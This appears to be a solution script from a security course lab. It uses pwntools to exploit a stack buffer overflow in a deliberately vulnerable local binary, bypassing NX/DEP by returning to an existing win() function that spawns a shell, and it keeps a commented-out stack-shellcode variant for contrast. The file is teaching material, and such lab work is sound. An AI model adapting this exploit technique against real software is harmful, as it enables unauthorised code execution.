#!/usr/bin/env python3
"""Solution for nx_demo: NX / DEP bypass by code reuse (lecture Mitigation #2).

With NX on, the return-to-stack shellcode from example3 CRASHES: the stack is
not executable. But DEP does not stop the overflow itself, so returning to
EXISTING code (win(), which calls system("/bin/sh")) still works.

Run:  cd example3 && make && python3 solution3/solve_nx_demo.py

To see NX block the stack shellcode, use the injected-shellcode path below
(commented out): under NX it faults instead of running.
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "nx_demo")

elf = ELF(BIN, checksec=False)      # NX enabled


def find_offset():
    io = process(BIN)
    io.recvuntil(b"input: ")
    io.sendline(cyclic(300))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset(buf -> return address) = %d", off)
    return off


def main():
    offset = find_offset()

    # Works under NX: return to existing code (no shellcode on the stack).
    payload = flat({offset: elf.symbols["win"]})

    # Would FAIL under NX (return-to-stack shellcode -- kept for contrast):
    #   io = process(BIN)
    #   buf_addr = int(io.recvline_startswith(b'buf is at ').split()[-1], 16)
    #   sc = asm(shellcraft.sh())
    #   payload = sc.ljust(offset, b'\x90') + p32(buf_addr)   # SIGSEGV: stack not executable

    io = process(BIN)
    io.recvuntil(b"input: ")
    io.sendline(payload)
    io.recvuntil(b"returned to existing code!")
    log.success("DEP bypassed via code reuse -- shell open")
    io.sendline(b"id; echo NX_BYPASS_VIA_CODE_REUSE")
    io.interactive()


if __name__ == "__main__":
    main()
